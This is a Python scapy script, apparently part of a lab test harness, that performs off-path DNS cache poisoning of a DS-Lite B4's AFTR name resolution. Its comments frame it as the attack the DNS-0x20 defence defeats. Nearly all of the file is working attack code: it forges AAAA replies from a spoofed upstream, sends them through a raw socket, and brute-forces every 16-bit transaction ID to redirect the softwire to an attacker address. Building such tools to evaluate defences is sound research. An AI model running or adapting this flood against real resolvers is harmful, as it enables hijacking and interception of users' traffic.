#!/usr/bin/python3
# dns_offpath_poison.py — off-path DNS cache poisoning of the B4's AFTR-FQDN
# resolution (the evolved T11, "Softwire DNS-Discovery Hijack").
#
# Threat model (Man et al. SADDNS + classic Kaminsky): an OFF-PATH attacker that
# cannot see the resolver's query. It is ASSUMED to know the resolver's upstream
# source port (derandomised via the SADDNS ICMP side channel — shown feasible:
# 300 probes -> 6 ICMP, the global rate limit leaks open/closed). It then races
# the (slow/absent) authoritative answer by flooding forged AAAA replies that
# brute-force the 16-bit TXID. A single matching reply poisons the resolver's
# cache for aftr.dslite.example.com -> attacker, and the B4 exit-hook rebuilds
# the softwire to the attacker.
#
# This tool is what the DNS-0x20 defence (Dagon et al., CCS 2008) defeats: the
# attacker is off-path, so it cannot reproduce the random CASE the resolver put
# in the query name; with 0x20 ON every forged reply is dropped on a case
# mismatch even though the port and TXID are right.
import argparse
import socket
import struct
import sys
import time

from scapy.layers.l2 import Ether
from scapy.layers.inet6 import IPv6, UDP
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.sendrecv import srp1
from scapy.layers.inet6 import ICMPv6ND_NS


def resolve_mac(iface, ip6):
    try:
        ans = srp1(Ether(dst="33:33:ff:00:00:01") / IPv6(dst=ip6) /
                   ICMPv6ND_NS(tgt=ip6), iface=iface, timeout=2, verbose=0)
        if ans:
            return ans[Ether].src
    except Exception:
        pass
    return "ff:ff:ff:ff:ff:ff"


def incr_cksum(buf, ck_off, word_off, new_word):
    """RFC 1624 incremental checksum update for a single changed 16-bit word."""
    old_ck = (buf[ck_off] << 8) | buf[ck_off + 1]
    old = (buf[word_off] << 8) | buf[word_off + 1]
    s = (~old_ck & 0xFFFF) + (~old & 0xFFFF) + new_word
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    new_ck = (~s) & 0xFFFF
    buf[word_off] = new_word >> 8
    buf[word_off + 1] = new_word & 0xFF
    buf[ck_off] = new_ck >> 8
    buf[ck_off + 1] = new_ck & 0xFF


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--iface", default="eth-isp")
    p.add_argument("--upstream", default="2001:db8:cafe::5", help="spoofed reply source")
    p.add_argument("--resolver", required=True, help="B4 resolver upstream-socket addr")
    p.add_argument("--resolver-port", type=int, default=33333)
    p.add_argument("--domain", default="aftr.dslite.example.com")
    p.add_argument("--poison-ip", required=True, help="attacker AAAA to inject")
    p.add_argument("--rounds", type=int, default=1)
    a = p.parse_args()

    dmac = resolve_mac(a.iface, a.resolver)
    smac = "02:00:00:00:0d:20"
    # forged AAAA reply (lowercase qname — the attacker cannot know the 0x20 case)
    dns = DNS(id=0, qr=1, aa=1,
              qd=DNSQR(qname=a.domain, qtype="AAAA"),
              an=DNSRR(rrname=a.domain, type="AAAA", rdata=a.poison_ip, ttl=60))
    pkt = (Ether(src=smac, dst=dmac) /
           IPv6(src=a.upstream, dst=a.resolver) /
           UDP(sport=53, dport=a.resolver_port) / dns)
    raw = bytearray(bytes(pkt))
    # offsets: Ether(14) + IPv6(40) + UDP: checksum at +6, payload(DNS) at +8
    udp_ck = 14 + 40 + 6
    dns_id = 14 + 40 + 8
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind((a.iface, 0))
    print(f"[t11-offpath] flooding forged AAAA {a.domain} -> {a.poison_ip} "
          f"to {a.resolver}:{a.resolver_port} (spoof src {a.upstream}), "
          f"brute 65536 TXIDs x{a.rounds}", flush=True)
    t0 = time.time()
    n = 0
    for _ in range(a.rounds):
        for txid in range(65536):
            incr_cksum(raw, udp_ck, dns_id, txid)
            s.send(raw)
            n += 1
    print(f"[t11-offpath] sent {n} forged replies in {time.time()-t0:.2f}s", flush=True)


if __name__ == "__main__":
    main()
